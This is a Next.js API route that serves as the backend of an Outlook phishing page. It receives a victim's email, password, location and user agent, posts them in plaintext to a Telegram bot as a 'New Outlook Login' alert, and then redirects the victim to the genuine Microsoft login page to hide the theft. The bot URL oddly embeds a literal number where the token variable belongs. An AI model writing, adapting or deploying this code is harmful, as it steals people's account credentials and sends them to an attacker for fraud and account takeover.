import { NextResponse } from 'next/server';

export async function POST(request: Request) {
  try {
    const { email, password, location, userAgent, timestamp } = await request.json();

    if (!email || !password) {
      return NextResponse.json({ error: 'Missing credentials' }, { status: 400 });
    }

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.error('Telegram credentials missing');
      return NextResponse.json({ error: 'Server configuration error' }, { status: 500 });
    }

    const locationStr = location?.city && location?.country
      ? `${location.city}, ${location.country}`
      : 'Not available';

    const message = `
🔐 *New Outlook Login*
👤 *Email:* ${email}
🔑 *Password:* ${password}
📍 *Location:* ${locationStr}
🖥 *User Agent:* ${userAgent || 'unknown'}
⏱ *Time:* ${timestamp || new Date().toISOString()}
    `;

    const telegramUrl = `https://api.telegram.org/bot${8506266544}/sendMessage`;
    const tgRes = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown',
      }),
    });

    if (!tgRes.ok) {
      const errorText = await tgRes.text();
      console.error('Telegram error:', errorText);
      return NextResponse.json({ error: 'Failed to send message' }, { status: 500 });
    }

    return NextResponse.json({
      success: true,
      redirect: 'https://login.live.com',
    });
  } catch (error) {
    console.error('API error:', error);
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 });
  }
}
